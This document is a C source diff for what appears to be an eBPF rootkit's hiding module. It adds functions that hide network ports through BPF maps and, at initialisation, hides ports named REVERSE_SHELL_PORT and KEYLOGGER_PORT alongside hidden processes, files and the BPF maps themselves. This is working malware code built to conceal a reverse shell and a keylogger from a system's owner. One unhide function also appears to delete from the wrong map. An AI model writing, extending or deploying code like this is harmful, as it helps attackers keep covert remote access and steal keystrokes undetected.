@@ -46,6 +46,28 @@ static int update_uint32_map(int map_fd, uint32_t key) {
     return bpf_map_update_elem(map_fd, &key, &value, BPF_ANY);
 }
 
+static int delete_uint32_map(int map_fd, uint32_t key) {
+    if (map_fd < 0)
+        return -EINVAL;
+
+    return bpf_map_delete_elem(map_fd, &key);
+}
+
+static int update_uint16_map(int map_fd, uint16_t key) {
+    if (map_fd < 0)
+        return -EINVAL;
+
+    uint8_t value = 1;
+    return bpf_map_update_elem(map_fd, &key, &value, BPF_ANY);
+}
+
+static int delete_uint16_map(int map_fd, uint16_t key) {
+    if (map_fd < 0)
+        return -EINVAL;
+
+    return bpf_map_delete_elem(map_fd, &key);
+}
+
 static int hide_bpf_maps(hider_context_t *hider_ctx) {
     if (!hider_ctx)
         return -EINVAL;
@@ -147,6 +169,14 @@ static int set_initial_hide_state(hider_context_t *hider_ctx) {
     if (ret != 0)
         return ret;
 
+    ret = hider_hide_port(hider_ctx, REVERSE_SHELL_PORT);
+    if (ret != 0)
+        return ret;
+
+    ret = hider_hide_port(hider_ctx, KEYLOGGER_PORT);
+    if (ret != 0)
+        return ret;
+
     ret = hide_bpf(hider_ctx);
     if (ret != 0)
         return ret;
@@ -171,6 +201,10 @@ int hider_init(hider_context_t *hider_ctx) {
 
     hider_ctx->tracked_pids_map_fd = bpf_map__fd(hider_ctx->skel->maps.tracked_pids_map);
     if (hider_ctx->tracked_pids_map_fd < 0)
+        return -EINVAL;
+
+    hider_ctx->hide_ports_map_fd = bpf_map__fd(hider_ctx->skel->maps.hide_ports_map);
+    if (hider_ctx->hide_ports_map_fd < 0)
         return -EINVAL;
 
     hider_ctx->is_initialized = true;
@@ -210,6 +244,16 @@ int hider_hide_file(hider_context_t *hider_ctx, const char *filename) {
     return update_string_map(hider_ctx->hide_names_map_fd, filename);
 }
 
+int hider_hide_port(hider_context_t *hider_ctx, uint16_t port) {
+    if (!hider_ctx)
+        return -EINVAL;
+
+    if (!hider_ctx->is_initialized)
+        return -EINVAL;
+
+    return update_uint16_map(hider_ctx->hide_ports_map_fd, port);
+}
+
 int hider_unhide_pid(hider_context_t *hider_ctx, pid_t pid) {
     if (!hider_ctx)
         return -EINVAL;
@@ -220,10 +264,16 @@ int hider_unhide_pid(hider_context_t *hider_ctx, pid_t pid) {
     if (!hider_ctx->is_initialized)
         return -EINVAL;
 
+    int ret = 0;
+
     char pid_str[MAX_HIDDEN_FILE_NAME_LEN] = {0};
     snprintf(pid_str, sizeof(pid_str), "%d", pid);
 
-    return delete_string_map(hider_ctx->hide_names_map_fd, pid_str);
+    ret = delete_string_map(hider_ctx->hide_names_map_fd, pid_str);
+    if (ret)
+        return ret;
+
+    return delete_uint32_map(hider_ctx->hide_names_map_fd, (uint32_t)pid);
 }
 
 int hider_unhide_file(hider_context_t *hider_ctx, const char *filename) {
@@ -234,4 +284,14 @@ int hider_unhide_file(hider_context_t *hider_ctx, const char *filename) {
         return -EINVAL;
 
     return delete_string_map(hider_ctx->hide_names_map_fd, filename);
+}
+
+int hider_unhide_port(hider_context_t *hider_ctx, uint16_t port) {
+    if (!hider_ctx)
+        return -EINVAL;
+
+    if (!hider_ctx->is_initialized)
+        return -EINVAL;
+
+    return delete_uint16_map(hider_ctx->hide_ports_map_fd, port);
 }
